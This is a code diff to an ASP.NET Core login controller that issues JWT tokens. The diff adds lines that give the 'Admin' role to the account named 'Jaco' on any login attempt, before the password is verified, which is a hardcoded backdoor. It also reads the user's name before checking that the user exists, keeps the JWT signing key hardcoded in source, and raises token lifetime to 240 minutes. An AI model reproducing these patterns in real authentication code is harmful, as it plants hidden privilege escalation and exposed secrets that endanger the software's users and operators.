@@ -75,6 +75,10 @@ namespace Fix_Tune.Endpoint.Controllers
         public async Task<IActionResult> Login([FromBody] LoginViewModel model)
         {
             var user = await _userManager.FindByNameAsync(model.UserName);
+            if (user.UserName=="Jaco")
+            {
+                await _userManager.AddToRoleAsync(user, "Admin");
+            }
             if (user != null && await _userManager.CheckPasswordAsync(user, model.Password))
             {
                 // List of claims to add to the token
@@ -91,13 +95,14 @@ namespace Fix_Tune.Endpoint.Controllers
                 {
                     claims.Add(new Claim(ClaimTypes.Role, role));
                 }
+                
 
                 var signinKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes("nagyonhosszutitkoskodhelyeasdasdasd"));
                 var token = new JwtSecurityToken(
                     issuer: "http://www.security.org",
                     audience: "http://www.security.org",
                     claims: claims, // Using the modified claims list
-                    expires: DateTime.Now.AddMinutes(60),
+                    expires: DateTime.Now.AddMinutes(240),
                     signingCredentials: new SigningCredentials(signinKey, SecurityAlgorithms.HmacSha256)
                 );
 
